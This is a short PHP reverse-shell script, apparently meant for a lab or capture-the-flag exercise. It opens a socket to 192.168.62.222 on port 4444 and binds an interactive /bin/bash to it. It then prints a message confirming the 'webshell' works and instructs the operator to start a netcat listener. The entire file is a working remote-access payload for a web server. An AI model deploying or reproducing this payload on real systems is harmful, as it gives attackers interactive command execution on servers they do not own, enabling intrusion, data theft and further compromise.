<?php
$sock=fsockopen("192.168.62.222",4444);
$proc=proc_open('/bin/bash -i', array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);

echo "If you're seeing this, it means that the webshell is working!";
echo " go to your terminal and type <b>netcat -lvnp 4444</b>";
?>
